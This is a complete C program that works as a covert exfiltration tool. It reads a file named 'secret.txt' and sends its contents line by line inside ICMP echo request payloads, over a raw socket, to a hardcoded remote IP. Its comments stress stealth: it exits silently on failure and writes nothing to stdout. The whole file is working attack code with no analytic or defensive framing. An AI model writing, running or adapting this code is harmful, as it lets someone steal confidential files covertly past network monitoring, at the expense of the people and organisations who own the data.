#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <fcntl.h>

#define DEST_IP "1.2.3.4"
#define FILE_TO_LEAK "secret.txt"
#define PACKET_SIZE 1024

// Checksum function (Standard implementation)
unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1)
        sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

int main() {
    // 1. Open the file to leak
    FILE *fp = fopen(FILE_TO_LEAK, "r");
    if (fp == NULL) {
        // Silent exit if file doesn't exist, or print to stderr only
        return 1;
    }

    // 2. Create Raw Socket
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sockfd < 0) {
        fclose(fp);
        return 1;
    }

    struct sockaddr_in dest_addr;
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_addr.s_addr = inet_addr(DEST_IP);

    char file_buffer[512]; // Chunk size
    char packet[PACKET_SIZE];
    int packet_count = 0;

    // 3. Read file loop
    while (fgets(file_buffer, sizeof(file_buffer), fp) != NULL) {
        memset(packet, 0, sizeof(packet));
        struct icmphdr *icmph = (struct icmphdr *)packet;

        // Fill ICMP Header (ECHO REQUEST)
        icmph->type = ICMP_ECHO;
        icmph->code = 0;
        icmph->un.echo.id = htons(getpid());
        icmph->un.echo.sequence = htons(packet_count++);
        icmph->checksum = 0;

        // Copy file content to payload
        char *payload = packet + sizeof(struct icmphdr);
        int payload_len = strlen(file_buffer);
        memcpy(payload, file_buffer, payload_len);

        // Calculate checksum
        int total_len = sizeof(struct icmphdr) + payload_len;
        icmph->checksum = checksum(packet, total_len);

        // 4. Send Packet 
        sendto(sockfd, packet, total_len, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

        // Small delay to not choke the network (optional)
        usleep(10000); 
    }

    // Cleanup
    fclose(fp);
    close(sockfd);
    
    // 5. No output to stdout ("background")
    return 0;
}









